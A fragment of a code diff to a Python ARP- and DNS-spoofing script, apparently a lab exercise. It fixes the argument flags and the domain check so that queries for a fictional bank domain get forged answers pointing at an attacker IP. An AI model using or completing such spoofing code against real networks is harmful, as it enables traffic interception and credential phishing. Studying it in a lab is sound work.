@@ -10,7 +10,7 @@ def parse_arguments():
     parser = argparse.ArgumentParser()
     parser.add_argument("-i", "--interface", help="network interface to bind to", required=True)
     parser.add_argument("-ip1", "--clientIP", help="IP of the client", required=True)
-    parser.add_argument("-ip3", "--serverIP", help="IP of the server", required=True)
+    parser.add_argument("-ip2", "--serverIP", help="IP of the server", required=True)
     parser.add_argument("-v", "--verbosity", help="verbosity level (0-2)", default=0, type=int)
     return parser.parse_args()
 
@@ -52,8 +52,9 @@ def restore(srcIP, srcMAC, dstIP, dstMAC):
 def fakedns(packet):
     try:
         qname = packet[DNSQR].qname
-        debug(f'{qname}')
-        if qname == 'www.bankofbailey.com':
+        qname = qname.decode('utf-8')
+        debug(f'Client is trying to resolve {qname}')
+        if qname != 'www.bankofbailey.com.':
             debug('Not our target domain')
             return packet
         packet[DNS].an = DNSRR(rrname=qname, rdata='10.4.63.200')
